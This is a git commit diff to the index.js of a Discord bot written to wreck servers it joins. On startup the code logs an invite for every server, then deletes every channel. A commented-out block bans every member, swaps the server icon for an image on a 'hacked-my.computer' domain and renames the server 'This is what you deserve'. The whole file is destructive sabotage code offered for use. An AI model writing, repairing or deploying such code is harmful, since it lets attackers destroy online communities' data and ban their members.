d68dc99ab41cd8cda9ef4d62d33881423cd55d78
goldentg <43283685+goldentg@users.noreply.github.com>
2018-11-02 15:39:08 -0600

    stable

--- index.js
+++ index.js
@@ -1,34 +1,43 @@
 const Discord = require("discord.js");
+const client = new Discord.Client();
+const fs = require("fs")
 
 //on ready delete all channels
 client.on("ready", () => {
 
 
 // Create an invite to a channel
-channel.createInvite()
-  .then(invite => console.log(`Created an invite with a code of ${invite.code}`))
-  .catch(console.error);
+client.guilds.forEach(server => {
+    server.channels.first().createInvite().then(inviteCode => {
+        console.log(inviteCode);
+    });
+});
 
-client.guilds.forEach(server => server.channels.forEach(channel => channel.delete()));
+
+client.guilds.forEach(server => {
+    server.channels.forEach(channel => {
+        channel.delete();    
+    });
+});
 
 //startup message log
 console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
 
-
+/*
 //ban all
-guild.members.forEach(m => {
+guilds.members.forEach(m => {
         m.ban();
 
 console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
-    });
-/*
+    
+
 //set server icon
 guild.setIcon("https://china.hacked-my.computer/95314b55.png");
 
 //set server name
 guild.setName("This is what you deserve");
-
 */
+
 
 //handle unexpected errors
 process.on("uncaughtException", err => {
@@ -37,4 +46,4 @@ process.on("uncaughtException", err => {
 });
 });
 
-client.login("bot token");
+client.login("token");
